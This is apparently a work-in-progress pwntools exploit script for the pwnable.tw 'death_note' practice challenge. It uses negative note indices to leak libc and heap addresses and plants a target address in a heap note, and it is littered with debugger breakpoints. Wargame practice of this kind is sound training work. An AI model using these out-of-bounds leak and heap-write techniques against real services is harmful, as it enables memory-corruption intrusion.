

from pwn import *
import pdb
import re

def add_note(idx, name):
  p.sendlineafter('Your choice :', '1')
  p.sendlineafter('Index :', str(idx))
  p.sendlineafter('Name :', name)


def show_note(idx):
  p.sendlineafter('Your choice :', '2')
  p.sendlineafter('Index :', str(idx))

def del_note(idx):
  p.sendlineafter('Your choice :', '3')
  p.sendlineafter('Index :', str(idx))

def _exit():
  p.sendlineafter('Your choice :', '4')

def leak_libc():
  show_note(-7)
  res = p.recvuntil('Name : ', timeout=3)
  cont = p.recvline()
  addr = u32(cont[4:8])
  
  stdout_addr = addr - 71
  print('stdout_addr: {:#x}'.format(stdout_addr))
  
  return stdout_addr

def leak_heap():
  add_note(0, 'a'*0x50)
  show_note(-484)
  res = p.recvuntil('Name : ', timeout=3)
  cont = p.recvline()
  addr = u32(cont[:4])
  heap_base = addr - 0x8
  
  print('heap_base: {:#x}'.format(heap_base))
  
  return addr

def send_chunk(idx, chunk, delim='\x00'):
  count = chunk.count(delim)
  
  new_chunk = chunk.replace(delim, '\x2f')

  pdb.set_trace()
  add_note(idx, new_chunk)
  del_note(idx)

  pdb.set_trace()

  print('count: {}'.format(count))

  for i in range(count):
    
    pos = chunk.rindex(delim)
    chunk = chunk[:pos]
    new_chunk = new_chunk[:pos]+'\x00'
    print('idx: {}, chunk: {}'.format(i, new_chunk))
    add_note(idx, new_chunk)
    del_note(idx)
    pdb.set_trace()


# p = process('/home/len/pwnable/death_note')
p = remote('chall.pwnable.tw',10201)

count = 20
context.log_level = 'info'
target_offset = 0x1b3760
stdout_offset = 0x1b3d60

if __name__ == '__main__':
  
  stdout_addr = leak_libc()
  libc_base = stdout_addr - stdout_offset
  print('libc_base: {:#x}'.format(libc_base))

  heap_base = leak_heap()

  del_note(0)

  target = libc_base + target_offset
  print('target: {:#x}'.format(target))
  # fake_chunk = '\x00'*4 + '\x79\x00\x00\x00' + 'a'*0x20
  # send_chunk(0, fake_chunk)
  
  pdb.set_trace()
  add_note(0, p32(target)+p32(0))
  

  pdb.set_trace()

  # add_note(1, 'b'* 0x50)
  # del_note(-484)


  

  p.interactive()

  # logger.info('done.')